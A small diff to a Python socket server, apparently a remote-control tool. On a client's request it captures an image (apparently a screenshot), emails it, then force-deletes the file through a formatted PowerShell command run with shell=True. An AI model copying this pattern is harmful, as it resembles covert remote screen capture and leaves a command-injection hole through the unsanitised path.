@@ -105,7 +105,7 @@ def conexion_client(client_conexion, addr):
                     print (email)
                     print ("Data Recived:\n==> {}\n==> {}".format(image_name, email))
                     path_image = option.capture_image(image_name)
-                    option.send_image(path_image, email)
+                    option.send_image(path_image, email, image_name)
                     remove_image = subprocess.run("powershell rm -Path {} -Force".format(path_image), shell=True)
                     conexion.send(b"Captura Sacada...check email... :)")
                     # Finish code
